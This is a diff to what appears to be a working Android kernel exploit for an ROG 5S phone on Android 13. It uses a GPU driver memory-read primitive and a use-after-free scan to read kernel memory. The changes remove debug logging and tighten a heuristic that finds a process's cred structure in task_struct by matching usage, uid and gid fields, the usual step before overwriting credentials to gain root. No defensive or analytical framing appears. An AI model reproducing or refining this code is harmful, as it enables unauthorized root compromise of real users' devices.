@@ -756,9 +756,7 @@ static int gpu_read_phys(int fd, uint64_t phys_addr, uint8_t *buffer, size_t siz
         msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
         memcpy(buffer, dst_vma, size);
         result = 0;
-        fprintf(stderr, "[GPU_READ_PHYS] success phys=0x%lx size=%zu first8=0x%lx\n", 
-                (unsigned long)phys_addr, size,
-                size >= 8 ? (unsigned long)*(uint64_t *)buffer : 0UL);
+        // Quiet mode: No more Successfully read logs here
     }
     else
     {
@@ -906,7 +904,7 @@ static int gpu_read_task_struct(int fd, uint64_t task_va, uint8_t *buffer, size_
         msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
         memcpy(buffer, dst_vma, size);
         result = 0;
-        fprintf(stderr, "[GPU_READ] Successfully read %zu bytes from 0x%lx\n", size, (unsigned long)task_va);
+        // Quiet mode
     }
     else
     {
@@ -1923,28 +1921,22 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 uint32_t found_cred_off = 0;
 
                 // Super Deep Scan for ROG 5S / Android 13
-                fprintf(stderr, "    [*] Searching for any UID (0-20000) in task_struct range 0x400-0xA00...\n");
+                fprintf(stderr, "    [*] Searching for any UID (0-20000) in task_struct (Lazy Scan)...\n");
                 uint8_t task_super[0x1000];
                 if (gpu_read_task_struct(fd, task_start_va, task_super, 0x1000) == 0) {
-                    for (int i = 0x400; i < 0xA00; i += 8) { // Расширили диапазон поиска
+                    for (int i = 0x400; i < 0xA00; i += 8) {
                         uint64_t ptr = *(uint64_t *)(task_super + i);
-                        if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                            uint32_t check[16]; // Читаем больше для поиска UID
-                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check, 64) == 0) {
-                                // Ищем UID в первых 64 байтах структуры cred
-                                for (int j = 0; j < 12; j++) {
-                                    uint32_t val = check[j];
-                                    // check[0] - это usage (atomic_t). Он ДОЛЖЕН быть > 0 для живого процесса.
-                                    if (check[0] > 0 && check[0] < 1000 && val <= 20000) {
-                                        // Если нашли UID, проверяем соседние поля (обычно uid == gid == suid == sgid)
-                                        if (check[j] == check[j+1] || check[j] == check[j+2]) {
-                                            found_cred_ptr = ptr;
-                                            found_cred_off = i;
-                                            fprintf(stderr, "    [+++] MATCH FOUND! Offset 0x%x -> Pointer 0x%lx (UID %u at cred+0x%x, usage %u)\n", 
-                                                    i, (unsigned long)ptr, val, j*4, check[0]);
-                                            break;
-                                        }
-                                    }
+                        // Проверяем только выровненные указатели ядра
+                        if ((ptr & 0xffffff0000000007ULL) == 0xffffff0000000000ULL) {
+                            uint32_t check[4]; // Читаем только 16 байт (usage + uid + gid)
+                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check, 16) == 0) {
+                                // check[0] - usage, check[1] - uid, check[2] - gid
+                                if (check[0] > 0 && check[0] < 50 && check[1] <= 20000 && (check[1] == check[2])) {
+                                    found_cred_ptr = ptr;
+                                    found_cred_off = i;
+                                    fprintf(stderr, "    [+++] MATCH FOUND! Offset 0x%x -> Pointer 0x%lx (UID %u, usage %u)\n", 
+                                            i, (unsigned long)ptr, check[1], check[0]);
+                                    break;
                                 }
                             }
                         }
